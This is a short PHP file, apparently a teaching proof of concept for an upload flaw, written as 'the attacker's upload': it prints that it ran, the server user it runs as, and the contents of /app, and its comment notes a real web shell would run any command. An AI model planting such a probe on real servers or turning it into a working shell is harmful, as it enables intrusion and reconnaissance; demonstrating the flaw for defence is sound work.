<?php
// The attacker's upload. A real web shell would run any command it was sent;
// this one only proves the point: it ran, as whom, and what it can see.
echo "This uploaded file just ran on the server.\n";
echo 'Running as: ', posix_getpwuid(posix_geteuid())['name'], "\n";
echo 'It can read your project: ', implode(', ', array_diff(scandir('/app'), ['.', '..'])), "\n";
